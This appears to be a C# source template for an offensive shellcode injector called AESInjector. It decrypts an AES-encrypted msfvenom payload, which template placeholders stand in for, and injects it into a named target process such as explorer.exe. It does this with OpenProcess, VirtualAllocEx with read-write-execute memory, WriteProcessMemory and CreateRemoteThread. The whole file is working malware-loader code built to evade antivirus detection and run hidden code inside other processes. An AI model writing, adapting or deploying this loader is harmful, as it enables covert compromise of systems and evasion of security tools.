using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;

namespace AESInjector
{
    public class Program
    {
        // P/Invoke declarations
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: AESInjector.exe <process_name>");
                Console.WriteLine("Example: AESInjector.exe explorer.exe");
                return;
            }

            string targetProcess = args[0];

            // AES-256 key (auto-generated during payload build)
            {{ csharp_key | indent(12) }}

            // AES IV (auto-generated during payload build)
            {{ csharp_iv | indent(12) }}

            // Encrypted shellcode (AES-256-CBC encrypted msfvenom payload)
            {{ csharp_shellcode | indent(12) }}

            // Decrypt the shellcode
            byte[] decryptedShellcode = DecryptAES(encryptedShellcode, aesKey, aesIV);

            Console.WriteLine($"[*] Decrypted shellcode size: {decryptedShellcode.Length} bytes");

            // Find target process
            Process[] processes = Process.GetProcessesByName(targetProcess.Replace(".exe", ""));
            if (processes.Length == 0)
            {
                Console.WriteLine($"[-] Process '{targetProcess}' not found!");
                return;
            }

            int pid = processes[0].Id;
            Console.WriteLine($"[+] Found {targetProcess} with PID: {pid}");

            // Open process
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open process!");
                return;
            }
            Console.WriteLine("[+] Process opened successfully");

            // Allocate memory in target process
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decryptedShellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory!");
                return;
            }
            Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToInt64():X}");

            // Write shellcode to target process
            UIntPtr bytesWritten;
            if (!WriteProcessMemory(hProcess, addr, decryptedShellcode, (uint)decryptedShellcode.Length, out bytesWritten))
            {
                Console.WriteLine("[-] Failed to write shellcode!");
                return;
            }
            Console.WriteLine($"[+] Wrote {bytesWritten} bytes to target process");

            // Create remote thread to execute shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create remote thread!");
                return;
            }

            Console.WriteLine("[+] Remote thread created successfully!");
            Console.WriteLine("[+] Shellcode injected and executing...");
        }

        static byte[] DecryptAES(byte[] encryptedData, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (System.IO.MemoryStream msPlain = new System.IO.MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            return msPlain.ToArray();
                        }
                    }
                }
            }
        }
    }
}
